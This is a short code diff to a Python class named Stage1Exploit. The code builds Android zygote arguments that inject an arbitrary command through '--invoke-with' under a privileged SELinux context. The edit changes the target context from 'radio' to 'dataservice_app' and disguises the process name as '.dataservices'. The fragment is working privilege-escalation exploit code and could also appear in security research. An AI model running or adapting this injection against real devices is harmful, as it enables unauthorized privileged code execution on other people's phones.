@@ -193,9 +193,9 @@ class Stage1Exploit:
             "--setgid=1001",
             "--setgroups=3003",
             "--runtime-args",
-            "--seinfo=platform:radio:complete",
+            "--nice-name=.dataservices",
+            "--seinfo=platform:dataservice_app:complete",
             "--runtime-flags=1",
-            "--nice-name=radio",
             "--invoke-with",
             f"{command}#",
         ]
